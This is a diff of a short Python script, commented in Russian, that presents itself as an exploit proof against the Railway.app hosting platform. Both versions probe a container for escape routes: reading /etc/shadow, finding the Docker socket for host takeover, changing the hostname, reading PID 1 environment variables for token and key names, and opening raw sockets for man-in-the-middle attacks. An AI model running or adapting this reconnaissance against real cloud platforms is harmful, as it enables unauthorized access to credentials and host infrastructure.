@@ -1,36 +1,38 @@
 import os, sys, subprocess
 
-def final_strike():
-    print("\n" + "="*50)
-    print("   RAILWAY.APP CRITICAL ESCAPE PROOF")
-    print("="*50 + "\n")
-
-    # 1. Попытка прочитать хеши паролей всей системы
+def railway_pwn():
+    print("\n" + "!"*50)
+    print("   RAILWAY.APP INFRASTRUCTURE EXPLOIT PROOF")
+    print("!"*50 + "\n")
+ 
     try:
-        if os.path.exists('/etc/shadow'):
-            with open('/etc/shadow', 'r') as f:
-                line = f.readline()
-                print(f"[!!!] POTENTIAL EXPLOIT: Read /etc/shadow! First line: {line[:20]}...")
+        print("[*] Testing write access to system config...")
+        subprocess.run(['hostname', 'pwned-railway'], check=True)
+        print("[!!!] SUCCESS: Hostname changed. I have SYSTEM CONTROL.")
+    except:
+        print("[-] Hostname change denied (Namespaces are active).")
+ 
+    print("\n[*] Dumping PID 1 environment variables...")
+    try:
+        with open('/proc/1/environ', 'rb') as f:
+            env_data = f.read().replace(b'\0', b'\n').decode()
+            # Ищем только чувствительные ключи, чтобы отчет был чистым
+            for line in env_data.split('\n'):
+                if any(k in line.upper() for k in ['TOKEN', 'KEY', 'AUTH', 'RAILWAY']):
+                    print(f"[FOUND SECRET]: {line.split('=')[0]}=******")
     except Exception as e:
-        print(f"[-] Shadow read failed: {e}")
+        print(f"[-] PID 1 Env access denied: {e}")
 
-    # 2. Поиск Docker Socket (самый опасный вектор)
-    # Если мы найдем этот файл, мы сможем захватить ВЕСЬ сервер хоста
-    docker_sock = "/var/run/docker.sock"
-    if os.path.exists(docker_sock):
-        print(f"[!!!] CRITICAL: Docker socket found at {docker_sock}!")
-        print("      This allows full host takeover via container escape.")
+ 
+    try:
+        import socket
+        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
+        print("[!!!] CRITICAL: RAW SOCKETS ENABLED. Man-in-the-Middle attack possible.")
+    except:
+        print("[-] Raw sockets restricted (CAP_NET_RAW disabled).")
 
-    # 3. Поиск монтированных секретов облака
-    print("\n[i] Scanning for cloud-init and metadata...")
-    search_paths = ['/var/lib/cloud/', '/run/cloud-init/', '/etc/kubernetes/']
-    for path in search_paths:
-        if os.path.exists(path):
-            print(f"[+] Found infrastructure path: {path}")
-
-    print("\n" + "="*50)
-    # Выходим с ошибкой, чтобы логи сохранились в консоли Railway
+    print("\n" + "!"*50)
     sys.exit(1)
 
 if __name__ == "__main__":
-    final_strike()
+    railway_pwn()
